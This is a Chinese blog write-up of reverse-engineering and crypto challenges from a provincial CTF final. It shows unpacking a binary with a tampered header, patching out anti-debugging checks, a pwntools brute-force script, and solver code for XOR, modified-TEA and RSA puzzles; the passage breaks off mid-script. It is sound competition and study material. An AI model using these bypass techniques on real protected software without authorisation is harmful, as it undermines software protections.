    <content type="html"><![CDATA[<p>还是太菜了，队友抬到二等奖，本来队友目标是一等的，呜呜，又拖后腿了，看到好多不会的，还得加油</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ida-pro"><a href="#ida-pro" class="headerlink" title="ida_pro"></a>ida_pro</h2><p>有壳，但是不能直接脱壳，看了一下发现是被modified</p><p>又发现EP节被改了，那就改回来，把O改成U，然后再去脱壳</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699706755416-69ff9169-671e-489d-b4ca-2b3502e5476b.png" class="" title="img"><p>看伪c，flag由4部分组成</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699706934797-bdb62d29-76b7-4079-98ca-521c49e53051.png" class="" title="img"><p>第一部分shift+f12</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699706986919-005de297-8113-4547-ad7c-82dec78e81a9.png" class="" title="img"><p>第二部分看函数名</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699707011688-db1d17ba-50f1-4d73-91e6-bba571173ab5.png" class="" title="img"><p>第三部分是Xref，一开始断网没想起来，后来才想到是交叉引用</p><p>比赛的时候看汇编看着看着就出了，其实是找第一个字串</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699707087398-c681109b-7de7-4045-8004-48b0f4e04429.png" class="" title="img"><p>交叉引用过去</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699707116570-b7e5ebff-6d06-42b2-ae3f-227fdee10cb0.png" class="" title="img"><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699707128382-8bfa8b4b-deb8-4a89-90ca-a9d77d3fced8.png" class="" title="img"><p>数字转ascii</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699707200114-896a274e-3983-4a36-9635-e89ee27c9c8a.png" class="" title="img"><p>连起来，注意一二两部分看似有两根下划线，实际上只有一根，两根也不符合常理</p><h2 id="Ez8or-1"><a href="#Ez8or-1" class="headerlink" title="Ez8or-1"></a>Ez8or-1</h2><p>有反调试</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699948300084-3305eb64-7290-435b-81b4-4674e7fef634.png" class="" title="img"><p>可以jnz改jmp强制跳转，也可以运行完cmp之后修改ZF的值，最终绕过反调试</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699948320463-aa775a22-8603-4873-8f6c-fcd0add24191.png" class="" title="img"><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1699948487227-69a1882b-4cf2-40ef-a127-f2a6d02c0f4b.png" class="" title="img"><p>这题因为比较的长度是输入的长度，并不是固定的60，所以可以采用爆破的形式，且是elf，用pwn的方式爆破更快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>filename = <span class="hljs-string">&#x27;./Ez8or&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><br>s1=<span class="hljs-string">&#x27;DASCTF&#123;&#x27;</span><br>ch=<span class="hljs-string">&quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM!@#$^+=%&amp;*()_-&#125;~/.&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">53</span>):<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ch)):<br>payload=s1+ch[j]<br>io = process(filename)<br>ru(<span class="hljs-string">&quot;[?] Plz input the flag:&quot;</span>)<br>sl(payload)<br>ru(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>s2=r()<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;incorrect&#x27;</span> <span class="hljs-keyword">in</span> s2:<br>io.close()<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>s1+=ch[j]<br><span class="hljs-built_in">print</span>(s1)<br>io.close()<br><span class="hljs-keyword">break</span><br><span class="hljs-comment">#inter()</span><br></code></pre></td></tr></table></figure><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723026552148-d155c9b9-c635-4a5d-b7a9-969e43116fb5.png" class="" title="img"><p>鸡哥直接逆向的，主要是我比赛写的脚本一直出不了，用python还是有点小trick</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xA8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>,<br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x94</span>,<br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x36</span>,<br>  <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>,<br>  <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xDE</span>,<br>  <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x26</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(a))<br>b23=<span class="hljs-number">0x2b</span><br>b22=<span class="hljs-number">0x8e</span><br>b21=<span class="hljs-number">0x7d</span><br>b24=<span class="hljs-number">0x31</span><br>b25=<span class="hljs-number">0x9c</span><br>b20=<span class="hljs-number">0x4f</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">60</span>,<span class="hljs-number">6</span>):<br>    v8=i-<span class="hljs-number">57</span>+<span class="hljs-number">256</span><span class="hljs-comment">#c负数可以强制类型转换，但是py直接-57得到的是-0x39，需要加256</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i,i+<span class="hljs-number">6</span>,<span class="hljs-number">1</span>):<br>        v8=v8&gt;&gt;(j%<span class="hljs-number">3</span>)<br><br>        a[j]^=v8<br><br>    a[i]^=b23<br>    b23+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">1</span>]^=b22<br>    b22+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">2</span>]^=b21<br>    b21+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">3</span>]^=b24<br>    b24+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">4</span>]^=b25<br>    b25+=<span class="hljs-number">1</span><br><br>    a[i+<span class="hljs-number">5</span>]^=b20<br>    b20+=<span class="hljs-number">1</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(a[i])<br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>后面研究了一下写c反而不容易出错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> __int8 v8;<br>    <span class="hljs-type">char</span> a[]=&#123;<span class="hljs-number">0xA8</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x48</span>,<br>              <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x94</span>,<br>              <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x36</span>,<br>              <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5E</span>,<br>              <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xDE</span>,<br>              <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x26</span>&#125;;<br>    <span class="hljs-type">int</span> b23=<span class="hljs-number">0x2b</span>;<br>    <span class="hljs-type">int</span> b22=<span class="hljs-number">0x8e</span>;<br>    <span class="hljs-type">int</span> b21=<span class="hljs-number">0x7d</span>;<br>    <span class="hljs-type">int</span> b24=<span class="hljs-number">0x31</span>;<br>    <span class="hljs-type">int</span> b25=<span class="hljs-number">0x9c</span>;<br>    <span class="hljs-type">int</span> b20=<span class="hljs-number">0x4f</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">60</span>;i+=<span class="hljs-number">6</span>)&#123;<br>        v8=i<span class="hljs-number">-57</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;i+<span class="hljs-number">6</span>;++j)&#123;<br>            v8=(<span class="hljs-type">int</span>)v8&gt;&gt;(j%<span class="hljs-number">3</span>);<br>            a[j]^=v8;<br>        &#125;<br>        a[i]^=b23++;<br>        a[i+<span class="hljs-number">1</span>]^=b22++;<br>        a[i+<span class="hljs-number">2</span>]^=b21++;<br>        a[i+<span class="hljs-number">3</span>]^=b24++;<br>        a[i+<span class="hljs-number">4</span>]^=b25++;<br>        a[i+<span class="hljs-number">5</span>]^=b20++;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">60</span>;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h2 id="apk-re-1"><a href="#apk-re-1" class="headerlink" title="apk_re-1"></a>apk_re-1</h2><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723019577885-52df344b-f78f-4882-8d0b-3d86796548d2.png" class="" title="img"><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723026852564-78c32a95-d52e-4ab2-95e8-edb603be89b2.png" class="" title="img"><p>tea魔改</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723080538824-586a93f0-9d8e-4367-aab3-2e5d1b051f4a.png" class="" title="img"><p>解完发现不对，找了一下发现还有初始化操作(感谢yuro✌提醒）</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723080514139-5a122714-ef72-42e2-a28d-8602220cc855.png" class="" title="img"><p>前面一部分相当于特征码搜索，找到i+31的地方改为75</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723221982668-6fb06871-e612-49aa-8938-b6711997f2ee.png" class="" title="img"><p>大概率是在tea算法中有修改</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723222235101-b3905bf7-866e-428d-9d03-984d46d1277e.png" class="" title="img"><p>原来的0b改为4b，从add变成sub，那大概率就对了</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723224496274-7a060096-a6e2-47ad-b032-72f26dc002ee.png" class="" title="img"><p>这题恶心的点在于输入的高位赋给v9，v9&#x3D;v7，v7最后是密文的低位</p><img src="/2024/08/10/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/1723224512887-de95c166-09ba-4124-80f4-5861d2efdf9a.png" class="" title="img"><p>还有解密的时候在写第几行千万要看仔细，我的经验是写哪行选中哪行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>]; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x69C36EC5</span>;<br>    <span class="hljs-type">uint32_t</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0xf9540b5c</span>,<span class="hljs-number">0x4bcb6502</span>,<span class="hljs-number">0x68542963</span>,<span class="hljs-number">0x47431049</span>,<span class="hljs-number">0xefd6a62c</span>,<span class="hljs-number">0xd200c2c2</span>,<span class="hljs-number">0x7e9a1b88</span>,<span class="hljs-number">0x3d98999c</span>,<span class="hljs-number">0xe9fbde0d</span>,<span class="hljs-number">0xf17cca00</span>&#125;;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">850486483</span>,<span class="hljs-number">132849155</span>,<span class="hljs-number">881013232</span>,<span class="hljs-number">1124630387</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// v为要加密的数据是两个32位无符号整数</span><br>    <span class="hljs-comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">10</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flag不全的话有可能是10</span><br>        sum = <span class="hljs-number">28</span>*delta;<br>        <span class="hljs-type">uint32_t</span> v9=v5[m];<br>        <span class="hljs-type">uint32_t</span> v6=v5[m+<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;=<span class="hljs-number">27</span>; i++) &#123;<br>            sum -= delta;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v9 -= ((v6 &lt;&lt; <span class="hljs-number">5</span>) + <span class="hljs-number">0x348331F0</span>) ^ (v6 + sum+delta) ^ ((v6 &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">0x43087F73</span>);<br>            v6 -= ((v9 &lt;&lt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x32B164D3</span>) ^ (v9 + sum+delta) ^ ((v9 &gt;&gt; <span class="hljs-number">6</span>) + <span class="hljs-number">0x7EB1E03</span>);<br>            v5[m]=v6;<br>            v5[m+<span class="hljs-number">1</span>]=v9;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//DASCTF&#123;1w0,W@NDr01DRe4v3rsE|S150-EA=1sy&#125; </span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from flag import flag</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><br><span class="hljs-comment">#assert size(m)&lt;360</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    r = getPrime(<span class="hljs-number">512</span>)<br>    s = getPrime(<span class="hljs-number">512</span>)<br>    t = getPrime(<span class="hljs-number">512</span>)<br>    real_p = p * q * r * s * t<br>    real_q = p + q + r + s + t<br>    <span class="hljs-keyword">if</span> isPrime(real_q) == <span class="hljs-literal">True</span>:<br>        n = real_p * real_q<br>        <span class="hljs-keyword">break</span><br><br>e=<span class="hljs-number">65537</span><br><span class="hljs-comment">#c=pow(m,e,n)</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;real_p=&#x27;</span>,real_p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;real_q=&#x27;</span>,real_q)<br><br><span class="hljs-comment">#print(&#x27;c=&#x27;,c)</span><br><br><br>real_p= <span class="hljs-number">55062197317446999463174096263876498316593115551165463378239159905809676640454208209918217385995561457672251651152473557992138742135601815169185076218362135899344751677854110957095631491941800392408438811446405332089775007801060526398896827361974179433880944797942088556569121442758603066960469154848058525555919633585074687002653178371734389317920858433073228324119903275748010661381766238387457768079481851583182446632335485869275973875534654769410510717692168386489418039967948185844825093846853624216235947670855966394462382073931422900372413115651622846475697848013017412006570314438593706146398436291246626158990758006393615755523796444561949003170112244508437710660501492796759763772367048031312446027160494843576151592257914618405347047042441934740949960412334441</span><br>real_q= <span class="hljs-number">45155472176560032394858410670734933043941707240560969397865820853107208563396632699891831616425752109128199454680206954866754585433276759685964959793491769</span><br>c= <span class="hljs-number">29523353286662420447288429739820034783180593797609319451802397100630230980492429018460170953928563500202582346942199142197785013588760361998950680313834852877108490792872966526015601050884302042018430083206594510237759312983601611859463798190030017950871533501858080631812335748118077560727632343411246129300608114305005550505334558174100631528820258311294104339625598892394650057151595693208992748213949675232397315855876112627150056755058037371576593415880216272977089381300018893299243081150404742921857440064511032025713772327330252031889227225225823090259315491541462395033093742723528280894218885823268632726414223235862198062147879817814619506196476372010238569022037192794906574876350397747710442236263832960264742898816690984736558117232240584876068441918457179310704845718452829124188403042383896118962087518608022867798693371250897927956711708162621772577123078819978462483151316840145260542738057960771219011604</span><br></code></pre></td></tr></table></figure><p>real_p并不是质数，要求phi还得知道p,q,r,s,t。然后看到assert size(m)&lt;360，m挺小，就可以把原本的模数n换成模数real_q，这样phi&#x3D;real_q-1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><br>real_p= <span 